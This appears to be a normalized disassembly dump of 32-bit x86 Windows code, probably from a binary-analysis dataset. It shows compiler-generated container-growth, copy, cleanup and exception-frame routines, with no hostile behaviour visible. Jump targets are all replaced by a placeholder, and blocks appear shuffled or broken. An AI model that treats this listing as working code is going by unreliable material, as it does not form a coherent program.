mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop edi
mov al 0x1
pop esi
retn 0x4
mov ecx esi
call sub_402c70
sub_403220
push ebp
mov ebp esp
push 0xffffffff
push sub_4be870
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
mov eax [ ebp + 0x10 ]
mov edx [ eax + 0x4 ]
push ebx
push esi
mov esi ecx
mov ecx [ eax ]
mov [ ebp - 0x1c ] ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] edx
jne r-xdata
mov eax [ esi + 0xc ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
test ecx ecx
jne r-xdata
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov edi [ esi + 0x8 ]
sub edi ecx
sar edi 0x3
xor edi edi
jmp r-xdata
test ecx ecx
jne r-xdata
mov ecx esi
call sub_402c70
mov ebx 0x1fffffff
sub ebx edi
cmp ebx edx
jae r-xdata
mov edi [ esi + 0x8 ]
sub edi ecx
sar edi 0x3
xor edi edi
jmp r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov eax ebx
sub eax edi
sar eax 0x3
cmp eax edx
jae r-xdata
mov edi eax
shr edi 0x1
mov ebx 0x1fffffff
sub ebx edi
cmp ebx eax
jae r-xdata
add edi edx
cmp eax edi
jae r-xdata
push ebx
push ecx
mov eax esp
mov [ eax ] ebx
mov [ ebp + 0xc ] esp
push ecx
shl edx 0x3
mov ecx esp
mov eax ebx
sub eax edx
mov [ ecx ] eax
mov [ ebp + 0xc ] esp
mov ecx esi
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] eax
call sub_4aae70
push ecx
mov [ esi + 0x8 ] eax
mov eax esp
mov [ ebp + 0x10 ] esp
push ecx
mov ecx [ ebp + 0xc ]
mov [ eax ] ebx
mov eax esp
mov [ ebp + 0x10 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
lea edx [ ebp + 0xc ]
mov [ ebp + 0xc ] esp
push edx
mov [ eax ] edi
call sub_4013f0
add esp 0x10
lea eax [ ebp - 0x1c ]
push eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
add ecx edi
mov [ eax ] ecx
lea eax [ edx * 8 ]
mov [ ebp + 0x8 ] eax
add eax edi
push eax
push ecx
mov eax esp
mov [ ebp + 0x10 ] esp
push ecx
mov [ eax ] ebx
mov eax esp
mov ecx esi
mov [ ebp + 0x10 ] esp
mov [ eax ] edi
call sub_4aae70
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
lea edx [ ebp - 0x1c ]
push edx
mov edx ecx
sub edx edi
sar edx 0x3
sub eax edx
push eax
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_43a250
mov ebx [ esi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ebx ecx
lea eax [ ebp - 0x1c ]
mov [ esi + 0x8 ] ebx
push eax
mov esi ebx
push ecx
mov eax esp
sub esi ecx
mov [ eax ] esi
jmp r-xdata
add eax edi
xor eax eax
jmp r-xdata
mov [ ebp + 0xc ] esp
push ecx
mov eax esp
mov [ eax ] edi
mov [ ebp + 0xc ] esp
call sub_43a220
add esp 0xc
mov edi [ esi + 0x8 ]
sub edi ecx
sar edi 0x3
xor edi edi
jmp r-xdata
test ecx ecx
jne r-xdata
shl eax 0x3
push eax
mov [ ebp + 0x10 ] eax
call sub_4b573e
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
add esp 0x4
push ecx
mov ebx eax
mov eax [ esi + 0x4 ]
push esi
push ebx
push ecx
mov ecx esp
mov [ ecx ] edx
push ecx
mov ecx esp
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] eax
call sub_45f700
mov edx [ ebp + 0xc ]
add esp 0x14
mov edi eax
mov eax [ ebp + 0xc ]
push eax
push esi
lea ecx [ ebp - 0x1c ]
push ecx
push edx
push edi
call sub_4607a0
mov edx [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
add esp 0x14
push edx
lea eax [ edi + eax * 8 ]
push esi
push eax
push ecx
mov eax esp
mov [ eax ] ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_45f700
mov ecx [ esi + 0x4 ]
add esp 0x14
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
add edi edx
cmp eax edi
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x10 ]
add edx ebx
lea eax [ ebx + edi * 8 ]
mov [ esi + 0xc ] edx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov edi [ ebp + 0xc ]
add edi eax
test ecx ecx
je r-xdata
add eax edx
sub_4034d0
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
mov esi ecx
mov edx [ esi + 0x8 ]
mov eax 0x5d1745d
sub eax edx
cmp eax ebx
push edi
jae r-xdata
mov ecx [ esi + 0x8 ]
mov eax ecx
shr eax 0x1
cmp eax 0x8
jae r-xdata
call sub_402cf0
cmp ebx eax
jae r-xdata
mov eax 0x8
mov edi [ esi + 0xc ]
lea eax [ ecx + ebx ]
shl eax 0x2
push eax
call sub_4b573e
mov edx [ esp + 0x18 ]
mov ecx [ esi + 0x8 ]
push edx
mov ebp eax
mov eax [ esi + 0x4 ]
push esi
lea edx [ ebp + edi * 4 ]
lea ecx [ eax + ecx * 4 ]
push edx
lea eax [ eax + edi * 4 ]
push ecx
push eax
call sub_453050
mov ecx [ esi + 0x4 ]
add esp 0x18
cmp edi ebx
ja r-xdata
mov edx 0x5d1745d
sub edx eax
cmp ecx edx
ja r-xdata
mov edx [ esp + 0x14 ]
push edx
push esi
push eax
lea eax [ ecx + ebx * 4 ]
push eax
push ecx
call sub_453050
mov eax [ esi + 0x4 ]
mov [ esp + 0x28 ] 0x0
mov edx [ esp + 0x28 ]
push edx
push esi
lea ecx [ eax + edi * 4 ]
push ebp
lea eax [ eax + ebx * 4 ]
push ecx
push eax
call sub_453050
mov ecx [ esp + 0x3c ]
push ecx
push esi
lea edx [ esp + 0x44 ]
push edx
push ebx
push eax
mov [ esp + 0x14 ] 0x0
mov edx [ esp + 0x14 ]
push edx
push esi
push eax
lea eax [ ecx + edi * 4 ]
push eax
push ecx
call sub_453050
mov ecx [ esp + 0x28 ]
push ecx
push esi
lea edx [ esp + 0x30 ]
push edx
mov ecx ebx
sub ecx edi
push ecx
push eax
call sub_420d80
mov [ esp + 0x3c ] 0x0
mov edx [ esp + 0x3c ]
push edx
push esi
lea eax [ esp + 0x44 ]
push eax
push edi
push ebp
jmp r-xdata
mov ebx eax
call sub_420d80
mov eax [ esi + 0x4 ]
add esp 0x3c
push eax
call j_sub_4b66ed#2
mov eax [ esi + 0x8 ]
add esp 0x4
add eax ebx
pop edi
mov [ esi + 0x4 ] ebp
mov [ esi + 0x8 ] eax
pop esi
pop ebp
pop ebx
retn 0x4
sub_403600
mov eax [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push esi
mov esi [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
mov eax esp
mov [ eax ] ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x1c ]
mov [ eax ] edx
mov eax esp
push esi
mov [ eax ] ecx
call sub_402e70
add esp 0x14
mov eax esi
pop esi
retn
sub_403640
push ebp
mov ebp esp
push 0xffffffff
push sub_4be891
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
nop
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0xc ] esi
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
dec edi
add esi 0x1c
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x8 ] esi
jmp r-xdata
mov eax [ ebp + 0x10 ]
push 0xffffffff
push ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push eax
mov ecx esi
mov [ esi + 0x4 ] bl
call sub_401dd0
cmp edi ebx
jbe r-xdata
sub_4036a6
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_4b5bd2
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x14 ]
push esi
mov ecx ebx
call sub_401f90
add esi 0x1c
cmp esi edi
jne r-xdata
sub_4036e0
push ebp
mov ebp esp
push 0xffffffff
push sub_4be8b1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
nop
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0xc ] esi
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
dec edi
add esi 0x38
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x8 ] esi
jmp r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov ecx esi
call sub_4020c0
cmp edi ebx
jbe r-xdata
sub_40373a
mov edi [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp edi eax
je r-xdata
push ebx
push ebx
call sub_4b5bd2
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
lea esi [ edi + 0x34 ]
lea esp [ esp ]
mov [ esi ] 0xf
mov [ esi - 0x4 ] ebx
mov [ esi - 0x14 ] bl
cmp [ esi - 0x1c ] 0x10
jb r-xdata
mov eax [ esi - 0x14 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ ebp + 0x8 ]
mov [ esi - 0x1c ] 0xf
mov [ esi - 0x20 ] ebx
mov [ esi - 0x30 ] bl
add edi 0x38
add esi 0x38
cmp edi eax
jne r-xdata
mov eax [ esi - 0x30 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ esi ] 0x10
jb r-xdata
sub_4037c0
push ebp
mov ebp esp
push 0xffffffff
push sub_4be8d1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
nop
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0x8 ] esi
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
add esi 0x70
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x10 ] esi
add edi 0x70
jmp r-xdata
push edi
mov ecx esi
call sub_402400
cmp edi [ ebp + 0xc ]
je r-xdata
sub_40381a
mov edi [ ebp - 0x14 ]
mov eax [ ebp + 0x10 ]
xor ebx ebx
cmp edi eax
je r-xdata
push ebx
push ebx
call sub_4b5bd2
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
lea esi [ edi + 0x6c ]
lea esp [ esp ]
mov [ esi ] 0xf
mov [ esi - 0x4 ] ebx
mov [ esi - 0x14 ] bl
cmp [ esi - 0x54 ] 0x10
jb r-xdata
mov eax [ esi - 0x14 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ ebp + 0x10 ]
mov [ esi - 0x54 ] 0xf
mov [ esi - 0x58 ] ebx
mov [ esi - 0x68 ] bl
add edi 0x70
add esi 0x70
cmp edi eax
jne r-xdata
mov eax [ esi - 0x68 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ esi ] 0x10
jb r-xdata
sub_4038b0
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ esi + 0x8 ]
inc eax
cmp ecx eax
push edi
ja r-xdata
mov edi [ esi + 0xc ]
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
add edi edx
cmp eax edi
ja r-xdata
push 0x1
mov ecx esi
call sub_4034d0
mov ecx [ esi + 0x4 ]
cmp [ ecx + edi * 4 ] 0x0
jne r-xdata
sub edi eax
mov eax [ esp + 0xc ]
mov ecx [ esi + 0x4 ]
mov edx [ ecx + edi * 4 ]
push eax
push edx
call sub_402e20
mov eax [ esi + 0x10 ]
add esp 0x8
inc eax
pop edi
mov [ esi + 0x10 ] eax
pop esi
retn 0x4
push 0x2c
call sub_4b573e
mov edx [ esi + 0x4 ]
add esp 0x4
mov [ edx + edi * 4 ] eax
sub_403920
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp esi edi
je r-xdata
pop edi
pop esi
retn 0x8
mov edi edi
mov ecx esi
call sub_401a90
add esi 0x70
cmp esi edi
jne r-xdata
sub_403950
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x18 ]
mov [ eax ] edx
mov eax esp
mov [ eax ] ecx
call sub_402eb0
add esp 0x14
retn 0xc
sub_403980
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x18 ]
mov [ eax ] edx
mov eax esp
mov [ eax ] ecx
call sub_402f50
add esp 0x14
retn 0xc
sub_4039b0
push ebp
mov ebp esp
push 0xffffffff
push sub_4be8f1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
nop
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0xc ] esi
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
dec edi
add esi 0x70
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x8 ] esi
jmp r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov ecx esi
call sub_402400
cmp edi ebx
jbe r-xdata
sub_403a0a
mov edi [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp edi eax
je r-xdata
push ebx
push ebx
call sub_4b5bd2
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
lea esi [ edi + 0x6c ]
lea esp [ esp ]
mov [ esi ] 0xf
mov [ esi - 0x4 ] ebx
mov [ esi - 0x14 ] bl
cmp [ esi - 0x54 ] 0x10
jb r-xdata
mov eax [ esi - 0x14 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ ebp + 0x8 ]
mov [ esi - 0x54 ] 0xf
mov [ esi - 0x58 ] ebx
mov [ esi - 0x68 ] bl
add edi 0x70
add esi 0x70
cmp edi eax
jne r-xdata
mov eax [ esi - 0x68 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ esi ] 0x10
jb r-xdata
sub_403a90
push esi
mov esi ecx
push edi
xor edi edi
push esi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
call [ InitializeCriticalSection@IAT ]
mov [ esi + 0x28 ] edi
pop edi
mov eax esi
pop esi
retn
sub_403ab0
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
pop ecx
retn
mov ecx [ esp + 0x4 ]
mov edx [ esi + 0x8 ]
push ecx
push esi
push edx
push eax
call sub_402270
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x14
sub_403af0
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push ecx
push esi
push edi
call sub_403640
mov eax esi
imul eax eax 0x1c
add esp 0x14
add eax edi
pop edi
pop esi
retn 0xc
sub_403b20
push ebx
mov ebx ecx
push esi
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
mov [ ebx + 0x4 ] 0x0
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0xc ] 0x0
pop ebx
retn
push edi
mov edi [ ebx + 0x8 ]
cmp esi edi
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
pop edi
mov ecx esi
call sub_401a90
add esi 0x70
cmp esi edi
jne r-xdata
sub_403b70
push ebx
mov ebx ecx
push esi
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
mov [ ebx + 0x4 ] 0x0
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0xc ] 0x0
pop ebx
retn
push edi
mov edi [ ebx + 0x8 ]
cmp esi edi
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
pop edi
mov ecx esi
call sub_401ae0
add esi 0x38
cmp esi edi
jne r-xdata
sub_403bc0
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push ecx
push esi
push edi
call sub_4036e0
mov eax esi
imul eax eax 0x38
add esp 0x14
add eax edi
pop edi
pop esi
retn 0xc
sub_403bf0
push ebp
mov ebp esp
push 0xffffffff
push sub_4be908
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0xffffffff
xor edi edi
mov esi ecx
push edi
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x1c ] 0xf
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x30 ] 0x0
call sub_401dd0
mov eax [ esi + 0x4 ]
cmp eax edi
mov [ ebp - 0x4 ] edi
je r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
mov ecx [ esi + 0xc ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add edx ecx
mov edi edx
cmp [ ebp - 0x1c ] 0x10
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp - 0x30 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esi + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov ecx esi
call sub_402c70
mov ecx 0x9249249
sub ecx edx
cmp ecx ebx
jae r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov edx ecx
sub edx edi
mov [ ebp + 0x10 ] edx
mov eax 0x92492493
imul edx
add edx [ ebp + 0x10 ]
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
cmp edx ebx
mov [ ebp - 0x18 ] ecx
jae r-xdata
mov eax edi
shr eax 0x1
mov ecx 0x9249249
sub ecx eax
cmp ecx edi
jae r-xdata
add edx ebx
cmp edi edx
jae r-xdata
push ecx
imul ebx ebx 0x1c
push ecx
mov eax esp
mov [ ebp + 0x8 ] esp
push ecx
mov [ eax ] ecx
sub ecx ebx
mov eax esp
mov [ ebp + 0x8 ] esp
mov [ ebp + 0x8 ] ecx
mov [ eax ] ecx
mov ecx esi
call sub_403950
mov edx [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
push ecx
mov ecx [ ebp - 0x18 ]
mov eax esp
mov [ ebp + 0xc ] esp
mov [ eax ] ecx
push ecx
mov eax esp
mov [ ebp + 0xc ] esp
push ecx
mov [ eax ] edx
mov eax esp
mov [ eax ] edi
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esp
push eax
call sub_402d70
add esp 0x10
lea ecx [ ebp - 0x34 ]
push ecx
push ecx
mov eax esp
add ebx edi
mov [ eax ] ebx
mov eax ebx
imul eax eax 0x1c
mov [ ebp + 0x10 ] eax
add eax edi
push eax
push ecx
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
mov ecx esi
mov [ ebp - 0x18 ] esp
mov [ eax ] edi
call sub_403950
mov ecx [ esi + 0x8 ]
sub ecx edi
lea edx [ ebp - 0x34 ]
push edx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
mov eax [ esi + 0x8 ]
sub ebx edx
push ebx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_403af0
mov edx [ esi + 0x8 ]
mov ecx [ ebp + 0x10 ]
add edx ecx
mov [ esi + 0x8 ] edx
mov esi edx
lea edx [ ebp - 0x34 ]
push edx
push ecx
mov eax esp
sub esi ecx
mov [ ebp - 0x4 ] 0x0
mov [ eax ] esi
jmp r-xdata
add edi eax
xor edi edi
jmp r-xdata
mov [ ebp + 0x8 ] esp
push ecx
mov eax esp
mov [ eax ] edi
mov [ ebp + 0x8 ] esp
call sub_4021f0
add esp 0xc
mov ecx [ esi + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
imul edi edi 0x1c
push edi
call sub_4b573e
mov edx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
add esp 0x4
push edx
mov edx [ ebp + 0x8 ]
push esi
push eax
push ecx
mov [ ebp + 0x10 ] eax
mov [ ebp + 0xc ] eax
mov eax esp
mov [ eax ] edx
push ecx
mov eax esp
mov [ ebp - 0x4 ] 0x1
mov [ eax ] ecx
call sub_402eb0
mov ecx [ ebp + 0x8 ]
add esp 0x14
push ecx
push esi
lea edx [ ebp - 0x34 ]
push edx
push ebx
push eax
mov [ ebp + 0xc ] eax
call sub_403640
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov eax ebx
imul eax eax 0x1c
add esp 0x14
add ecx eax
mov eax [ esi + 0x8 ]
push edx
push esi
push ecx
push ecx
mov [ ebp + 0xc ] ecx
mov ecx esp
mov [ ecx ] eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_402eb0
mov eax [ esi + 0x4 ]
add esp 0x14
test eax eax
jne r-xdata
mov ecx esi
call sub_4010c0
mov edi eax
add edi ebx
add edx ebx
cmp edi edx
jae r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov eax [ ebp + 0x10 ]
imul ebx ebx 0x1c
add edi eax
add ebx eax
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
push ecx
push esi
push edx
push eax
call sub_402270
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x14
mov eax [ esi + 0x4 ]
add ebx edx
test eax eax
je r-xdata
sub_403f60
push ebp
mov ebp esp
push 0xffffffff
push sub_4be928
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x10 ] esp
push eax
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x14 ] esi
call sub_4020c0
mov eax [ esi + 0x4 ]
xor edi edi
cmp eax edi
mov [ ebp - 0x4 ] edi
je r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
mov ecx [ esi + 0xc ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add edx ecx
mov edi edx
mov eax [ ebp - 0x1c ]
mov esi 0x10
cmp eax esi
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
cmp [ ebp - 0x38 ] esi
mov [ ebp - 0x1c ] 0xf
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esi + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp - 0x4c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov ecx esi
call sub_402c70
mov ecx 0x4924924
sub ecx edx
cmp ecx ebx
jae r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov edx ecx
sub edx edi
mov [ ebp + 0x10 ] edx
mov eax 0x92492493
imul edx
add edx [ ebp + 0x10 ]
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
cmp edx ebx
mov [ ebp - 0x18 ] ecx
jae r-xdata
mov eax edi
shr eax 0x1
mov ecx 0x4924924
sub ecx eax
cmp ecx edi
jae r-xdata
add edx ebx
cmp edi edx
jae r-xdata
push ecx
imul ebx ebx 0x38
push ecx
mov eax esp
mov [ ebp + 0x8 ] esp
push ecx
mov [ eax ] ecx
sub ecx ebx
mov eax esp
mov [ ebp + 0x8 ] esp
mov [ ebp + 0x8 ] ecx
mov [ eax ] ecx
mov ecx esi
call sub_403980
mov edx [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
push ecx
mov ecx [ ebp - 0x18 ]
mov eax esp
mov [ ebp + 0xc ] esp
mov [ eax ] ecx
push ecx
mov eax esp
mov [ ebp + 0xc ] esp
push ecx
mov [ eax ] edx
mov eax esp
mov [ eax ] edi
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esp
push eax
call sub_402de0
add esp 0x10
lea ecx [ ebp - 0x50 ]
push ecx
push ecx
mov eax esp
add ebx edi
mov [ eax ] ebx
mov eax ebx
imul eax eax 0x38
mov [ ebp + 0x10 ] eax
add eax edi
push eax
push ecx
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
mov ecx esi
mov [ ebp - 0x18 ] esp
mov [ eax ] edi
call sub_403980
mov ecx [ esi + 0x8 ]
sub ecx edi
lea edx [ ebp - 0x50 ]
push edx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov eax [ esi + 0x8 ]
sub ebx edx
push ebx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_403bc0
mov edx [ esi + 0x8 ]
mov ecx [ ebp + 0x10 ]
add edx ecx
mov [ esi + 0x8 ] edx
mov esi edx
lea edx [ ebp - 0x50 ]
push edx
push ecx
mov eax esp
sub esi ecx
mov [ ebp - 0x4 ] 0x0
mov [ eax ] esi
jmp r-xdata
add edi eax
xor edi edi
jmp r-xdata
mov [ ebp + 0x8 ] esp
push ecx
mov eax esp
mov [ eax ] edi
mov [ ebp + 0x8 ] esp
call sub_4a4560
add esp 0xc
mov ecx [ esi + 0x8 ]
sub ecx eax
